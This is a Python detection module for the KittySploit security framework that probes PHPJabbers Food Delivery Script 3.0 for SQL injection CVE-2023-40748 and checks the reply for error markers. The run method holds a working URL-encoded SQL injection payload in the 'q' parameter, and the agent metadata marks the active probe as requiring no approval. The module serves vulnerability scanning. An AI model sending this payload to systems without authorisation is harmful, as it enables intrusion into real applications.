#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PHPJabbers Food Delivery Script 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHPJabbers Food Delivery Script - SQL Injection Detection',
        'description': 'PHPJabbers Food Delivery Script 3.0 has a SQL injection (SQLi) vulnerability in the "q" parameter of index.php.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'phpjabbers', 'food-delivery', 'sqli', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://medium.com/@tfortinsec/multiple-vulnerabilities-in-phpjabbers-part-3-40fc3565982f',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-40748',
        ],
        'cve': 'CVE-2023-40748',
    }

    def run(self):
        path = '/index.php?controller=pjAdminOrders%26action%3dpjActionGetNewOrder%26column%3dcreated%26direction%3dASC%26page%3d1%26rowCount%3d50%26q%3d-1910%27)+OR+6100%3d6100%23%26type%3d'
        r = self.http_request(method='POST', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('class <strong>pjAdminOrdersaction', "didn't exists",)
        if all(m in body for m in body_all):
            self.set_info(
                severity='critical',
                reason='PHPJabbers Food Delivery Script - SQL Injection detected',
                path=path,
            )
            return True
        return False

